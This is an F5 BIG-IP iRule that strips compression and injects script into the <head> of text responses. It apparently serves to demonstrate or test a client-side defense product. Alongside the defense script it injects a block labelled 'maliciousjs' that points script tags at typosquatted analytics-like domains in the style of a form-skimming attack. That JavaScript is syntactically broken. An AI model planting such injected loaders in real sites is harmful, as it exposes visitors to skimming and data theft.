when HTTP_REQUEST {
  # Disable the stream filter for all requests
  STREAM::disable

  # LTM does not uncompress response content, so if the webserver has compression enabled
  # we must prevent the server from send us a compressed response by changing the request
  # header that indicates client support for compression (on our LTM client-side we can re-
  # apply compression before the response goes across the Internet)
  # Check if response type is text
  HTTP::header remove "Accept-Encoding"
  log local0. "Removed Accept-Encoding"
}

when HTTP_RESPONSE {
  # Check if response type is text
  if {[HTTP::header value Content-Type] starts_with "text"} {
    # get the JS from the Datagroup
    set csdjs [class match -value "default" equals client_side_defense_js] 
    log local0. "JS to inject: $csdjs"
    
    set maliciousjs {<script>(function(){
            var s = document.createElement('script');
         var domains =
          "ganalitis.com",
          "ganalitics.com",
          "gstatcs.com",
          "webfaset.com",
          "fountm.online",     
          "pixupjqes.tech",
          "jqwereid.online"];
            for (var i = 0; i < domains.length; ++i){
          s.src = 'https://' + domains[i];
          }
         })();</script>}
    
    # Replace http:// with https://
    log local0. "Searching for <head>"
    STREAM::expression "@<head>@<head>$csdjs$maliciousjs@"

    # Enable the stream filter for this response only
    STREAM::enable
  }
}


when STREAM_MATCHED {
    log local0. "We got a hit!"
}